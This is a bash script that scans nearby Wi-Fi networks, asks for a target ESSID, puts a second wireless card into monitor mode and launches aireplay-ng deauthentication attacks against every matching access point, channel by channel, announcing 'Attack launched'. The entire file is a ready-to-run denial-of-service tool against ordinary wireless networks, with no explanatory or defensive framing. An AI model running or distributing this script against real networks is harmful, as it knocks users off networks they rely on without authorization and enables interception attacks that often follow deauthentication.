#!/bin/bash

sudo iwlist wlp4s0 scan | grep "ESSID"
read essid
#essid="TP-Link_0816"
clear
array=( $(sudo iwlist wlp4s0 scan | grep "Address\|Channel:\|ESSID:" | grep -B 2 "${essid}") )
count=0
echo "Do you want to DEAUTH attack ${essid} Yes/No ?"
read response
if [ $response = Yes ]
then
	sudo ifconfig wlxf81a6709dba3 down
	sudo iwconfig wlxf81a6709dba3 mode monitor
	sudo ifconfig wlxf81a6709dba3 up
	echo "Attack launched"
	for i in "${array[@]}"
	do
		if [ $(($count%8)) -eq 4 ]
		then
			address=$i
		fi
		if [ $(($count%8)) -eq 5 ]
		then
			channel="${i//[!0-9]/}"
			#echo "Channel ${channel} and MAC ${address}"
			sudo iwconfig wlxf81a6709dba3 channel ${channel}
			sudo aireplay-ng -0 150 -a ${address} wlxf81a6709dba3
		fi
		((++count))
	done
fi
